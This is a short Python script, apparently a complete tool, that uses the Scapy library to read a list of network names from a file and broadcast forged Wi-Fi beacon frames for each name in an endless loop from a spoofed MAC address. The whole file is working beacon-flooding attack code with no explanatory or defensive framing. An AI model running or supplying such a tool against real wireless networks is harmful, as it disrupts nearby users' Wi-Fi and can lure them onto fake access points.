from scapy.all import *
import sys


def openfile(inf, ssid_list):
    inf=inf
    with open(ssid_list) as f:
        tmp = f.readlines()
    tmp =[x.replace('\n',"") for x in tmp]
    flooding(inf, tmp)
 
 
def flooding(inf, ssids):
    srcmac='12:13:15:16:17:19'   
    ssids =[x.encode('UTF-8') for x in ssids]
    while True:  
        for i in ssids:                      
            ssid=i      
            dot11 = Dot11(type=0, subtype=8, addr1 = 'ff:ff:ff:ff:ff:ff', addr2=srcmac, addr3=srcmac)
            beacon = Dot11Beacon(cap='ESS+privacy')
            essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
            rsn = Dot11EltRSN()
            
            frame = RadioTap()/dot11/beacon/essid/rsn
            sendp(frame, iface=inf, inter=0.100000, loop=0)
            print(ssid)
            
            
if __name__=='__main__':
    interface=sys.argv[1]
    ssid_list=sys.argv[2]
    openfile(interface, ssid_list)
    